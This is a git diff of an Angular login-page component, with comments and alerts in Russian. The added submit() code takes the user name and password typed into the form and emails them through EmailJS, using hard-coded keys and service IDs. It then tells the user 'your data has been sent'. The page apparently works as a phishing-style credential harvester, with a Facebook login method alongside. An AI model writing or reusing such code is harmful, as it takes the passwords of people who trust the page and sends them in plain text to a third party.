@@ -7,8 +7,8 @@ import {
   Validators,
 } from '@angular/forms';
 import { Router, RouterLink } from '@angular/router';
+import emailJS, { EmailJSResponseStatus } from 'emailjs-com';
 import { InputTextModule } from 'primeng/inputtext';
-import emailjs, { EmailJSResponseStatus } from '@emailjs/browser';
 
 @Component({
   selector: 'app-authorization',
@@ -34,18 +34,25 @@ export class AuthorizationPage {
     });
   }
 
-  submit(event: any) {
-    const d = document.getElementById('sss') as HTMLFormElement;
-    emailjs
-      .sendForm('service_m1f4mml', 'template_m1odwcw', d, '5-LxPY2MOlzY5LmKb')
-      .then(
-        () => {
-          alert('Ваше данные отправлены');
-        },
-        (error) => {
-          console.log(error.text);
-        }
-      );
+  submit() {
+    (function () {
+      emailJS.init('5-LxPY2MOlzY5LmKb');
+    })();
+    const templateID = 'template_m1odwcw';
+    const serviceID = 'service_c22mds6';
+
+    const params = {
+      senderusername: this.form.value?.userName,
+      senderpassword: this.form.value?.password,
+    };
+    emailJS.send(serviceID, templateID, params).then(
+      () => {
+        alert('Ваше данные отправлены');
+      },
+      (error) => {
+        console.log(error.text);
+      }
+    );
   }
 
   facebook() {
